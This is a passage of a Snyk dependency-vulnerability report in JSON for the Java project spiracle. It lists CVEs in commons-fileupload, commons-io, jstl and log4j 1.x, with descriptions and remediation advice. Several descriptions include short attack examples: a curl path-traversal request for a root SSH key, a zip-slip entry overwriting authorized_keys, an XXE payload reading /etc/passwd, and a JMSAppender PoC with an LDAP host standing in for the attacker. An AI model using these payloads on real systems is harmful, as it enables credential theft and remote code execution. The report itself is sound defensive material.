      "moduleName": "commons-fileupload:commons-fileupload",
      "packageManager": "maven",
      "packageName": "commons-fileupload:commons-fileupload",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-25T16:51:56Z",
      "references": [
        {
          "title": "Apache Mail Archive",
          "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201606.mbox/%3C6223ece6-2b41-ef4f-22f9-d3481e492832@apache.org%3E"
        },
        {
          "title": "Apache-SVN",
          "url": "http://svn.apache.org/viewvc/commons/proper/fileupload/trunk/RELEASE-NOTES.txt?r1=1745717&r2=1749637&diff_format=h"
        },
        {
          "title": "CVE Details",
          "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3092"
        },
        {
          "title": "Github ChangeLog",
          "url": "https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml%23L84"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat80/commit/d752a415a875e888d8c8d0988dfbde95c2c6fb1d"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/2c3553f3681baf775c50bb0b49ea61cb44ea914f"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/tomcat/commit/8999f8243197a5f8297d0cb1a0d86ed175678a77"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1349475"
        }
      ],
      "semver": {
        "vulnerable": [
          "[1.3,1.3.2)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-fileupload:commons-fileupload@1.3"
      ],
      "upgradePath": [
        false,
        "commons-fileupload:commons-fileupload@1.3.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:18.753000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[`commons-fileupload:commons-fileupload`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22commons-fileupload%22)\nThe Apache Commons FileUpload library contains a Java Object that, upon deserialization, can be manipulated to write or copy files in arbitrary locations. If integrated with [`ysoserial`](https://github.com/frohoff/ysoserial), it is possible to upload and execute binaries in a single deserialization call.\n\n# Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n- Apache Blog\n\n## Remediation\nUpgrade `commons-fileupload` to version 1.3.3 or higher.\n\n\n## References\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1000031)\n- [Tenable Security](http://www.tenable.com/security/research/tra-2016-12)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml#L65)\n- [Github Commit](https://github.com/apache/commons-fileupload/commit/388e824518697c2c8f9f83fd964621d9c2f8fc4c)\n",
      "disclosureTime": "2016-10-25T14:29:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "DiskFileItem",
            "filePath": "org/apache/commons/fileupload/disk/DiskFileItem.java",
            "functionName": "readObject"
          },
          "version": [
            "[1.1,1.3.3)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.commons.fileupload.disk.DiskFileItem",
            "functionName": "readObject"
          },
          "version": [
            "[1.1,1.3.3)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30401",
      "identifiers": {
        "CVE": [
          "CVE-2016-1000031"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-fileupload",
        "groupId": "commons-fileupload"
      },
      "modificationTime": "2019-06-02T07:36:59.369724Z",
      "moduleName": "commons-fileupload:commons-fileupload",
      "packageManager": "maven",
      "packageName": "commons-fileupload:commons-fileupload",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-10-26T03:04:11.895000Z",
      "references": [
        {
          "title": "Github ChangeLog",
          "url": "https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml%23L65"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-fileupload/commit/388e824518697c2c8f9f83fd964621d9c2f8fc4c"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1000031"
        },
        {
          "title": "Tenable Security",
          "url": "http://www.tenable.com/security/research/tra-2016-12"
        }
      ],
      "semver": {
        "vulnerable": [
          "[1.1,1.3.3)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "critical",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-fileupload:commons-fileupload@1.3"
      ],
      "upgradePath": [
        false,
        "commons-fileupload:commons-fileupload@1.3.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2017-10-01T08:05:48.497000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\r\n[`commons-fileupload:commons-fileupload`](https://commons.apache.org/proper/commons-fileupload/) provides a simple yet flexible means of adding support for multipart file upload functionality to servlets and web applications.\r\n\r\nAffected versions of the package are vulnerable to Information Disclosure because the `InputStream` is not closed on exception.\r\n\r\n## Remediation\r\nUpgrade `commons-fileupload` to version 1.3.2 or higher.\r\n\r\n## References\r\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml#L56)\r\n- [Github Commit](https://github.com/apache/commons-fileupload/commit/5b4881d7f75f439326f54fa554a9ca7de6d60814)",
      "disclosureTime": "2014-02-17T22:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.2"
      ],
      "functions": [
        {
          "functionId": {
            "className": "FileUpload",
            "filePath": "org/apache/commons/fileupload/FileUpload.java",
            "functionName": "parseRequest"
          },
          "version": [
            "[,1.0-rc1)"
          ]
        },
        {
          "functionId": {
            "className": "FileUploadBase",
            "filePath": "org/apache/commons/fileupload/FileUploadBase.java",
            "functionName": "parseRequest"
          },
          "version": [
            "[1.0-rc1,1.2.0)"
          ]
        },
        {
          "functionId": {
            "className": "FileUploadBase$FileItemIteratorImpl",
            "filePath": "org/apache/commons/fileupload/FileUploadBase$FileItemIteratorImpl.java",
            "functionName": "<init>"
          },
          "version": [
            "[1.2.0 ,1.3.2)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.commons.fileupload.FileUpload",
            "functionName": "parseRequest"
          },
          "version": [
            "[,1.0-rc1)"
          ]
        },
        {
          "functionId": {
            "className": "org.apache.commons.fileupload.FileUploadBase",
            "functionName": "parseRequest"
          },
          "version": [
            "[1.0-rc1,1.2.0)"
          ]
        },
        {
          "functionId": {
            "className": "org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl",
            "functionName": "<init>"
          },
          "version": [
            "[1.2.0 ,1.3.2)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-31540",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-200"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-fileupload",
        "groupId": "commons-fileupload"
      },
      "modificationTime": "2020-06-22T17:20:16.073581Z",
      "moduleName": "commons-fileupload:commons-fileupload",
      "packageManager": "maven",
      "packageName": "commons-fileupload:commons-fileupload",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-02-17T08:05:48Z",
      "references": [
        {
          "title": "Github ChangeLog",
          "url": "https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml%23L56"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-fileupload/commit/5b4881d7f75f439326f54fa554a9ca7de6d60814"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.3.2)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-fileupload:commons-fileupload@1.3"
      ],
      "upgradePath": [
        false,
        "commons-fileupload:commons-fileupload@1.3.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F",
      "alternativeIds": [],
      "creationTime": "2021-04-27T10:51:05.462338Z",
      "credit": [
        "Lukas Euler"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[commons-io:commons-io](https://search.maven.org/artifact/commons-io/commons-io) is a The Apache Commons IO library contains utility classes, stream implementations, file filters, file comparators, endian transformation classes, and much more.\n\nAffected versions of this package are vulnerable to Directory Traversal via calling the method FileNameUtils.normalize using an improper string like `//../foo` or `\\\\..\\foo`, which may allow access to files in the parent directory.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `commons-io:commons-io` to version 2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d)\n- [Jira Issue](https://issues.apache.org/jira/browse/IO-556)\n- [PoC](https://github.com/AlAIAL90/CVE-2021-29425)\n",
      "disclosureTime": "2021-04-26T16:04:00Z",
      "exploit": "Functional",
      "fixedIn": [
        "2.7"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-COMMONSIO-1277109",
      "identifiers": {
        "CVE": [
          "CVE-2021-29425"
        ],
        "CWE": [
          "CWE-20",
          "CWE-22"
        ],
        "GHSA": [
          "GHSA-gwrp-pvrq-jmwv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-io",
        "groupId": "commons-io"
      },
      "modificationTime": "2021-04-27T14:26:12.193344Z",
      "moduleName": "commons-io:commons-io",
      "packageManager": "maven",
      "packageName": "commons-io:commons-io",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-04-27T14:26:12Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/IO-556"
        },
        {
          "title": "PoC",
          "url": "https://github.com/AlAIAL90/CVE-2021-29425"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0, 2.7)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Directory Traversal",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-fileupload:commons-fileupload@1.3",
        "commons-io:commons-io@2.2"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "commons-io:commons-io",
      "version": "2.2"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:19.341000Z",
      "credit": [
        "David Jorm"
      ],
      "cvssScore": 7.3,
      "description": "## Overview\n[javax.servlet:jstl](https://mvnrepository.com/artifact/javax.servlet/jstl) is a collection of useful JSP tags which encapsulates the core functionality common to many JSP applications.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nThere is no fixed version for `javax.servlet:jstl`.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",
      "disclosureTime": "2015-02-27T16:13:27Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-JAVAXSERVLET-30449",
      "identifiers": {
        "CVE": [
          "CVE-2015-0254"
        ],
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-6x4w-8w53-xrvv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jstl",
        "groupId": "javax.servlet"
      },
      "modificationTime": "2019-04-18T07:20:47.242780Z",
      "moduleName": "javax.servlet:jstl",
      "packageManager": "maven",
      "packageName": "javax.servlet:jstl",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2015-02-27T16:51:55Z",
      "references": [
        {
          "title": "Apache Mail Archive",
          "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254"
        },
        {
          "title": "RedHat CVE Database",
          "url": "https://access.redhat.com/security/cve/CVE-2015-0254"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "javax.servlet:jstl@1.2"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "javax.servlet:jstl",
      "version": "1.2"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2021-06-04T15:38:41.700520Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n",
      "disclosureTime": "2020-04-27T17:16:14Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-1300176",
      "identifiers": {
        "CVE": [
          "CVE-2020-9488"
        ],
        "CWE": [
          "CWE-297"
        ],
        "GHSA": [
          "GHSA-vwqq-5vrc-xw9h"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2021-06-04T15:38:41.700537Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-28T17:16:14Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/LOG4J2-2819"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Man-in-the-Middle (MitM)",
      "severityWithCritical": "low",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-12-13T14:52:40.887231Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.6,
      "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
      "disclosureTime": "2021-12-10T00:00:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2316893",
      "identifiers": {
        "CVE": [
          "CVE-2021-4104"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2021-12-13T15:44:22.774691Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-12-13T15:31:00Z",
      "references": [
        {
          "title": "Apache Mail",
          "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx"
        },
        {
          "title": "GitHub Comment",
          "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301"
        },
        {
          "title": "GitHub Discussion",
          "url": "https://github.com/apache/logging-log4j2/pull/608"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": true,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:06:29.378900Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n",
      "disclosureTime": "2022-01-18T17:01:37Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2342645",
      "identifiers": {
        "CVE": [
          "CVE-2022-23305"
        ],
        "CWE": [
          "CWE-89"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-01-18T17:13:25.423081Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:13:25.563591Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": true,
      "title": "SQL Injection",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:08:37.955423Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [NVD Information](https://nvd.nist.gov/vuln/detail/CVE-2020-9493)\n",
      "disclosureTime": "2022-01-18T17:06:32Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2342646",
      "identifiers": {
        "CVE": [
          "CVE-2022-23307"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-01-18T17:13:25.244196Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:13:25.403564Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        },
        {
          "title": "NVD Information",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9493"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": true,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-18T17:25:51.891230Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
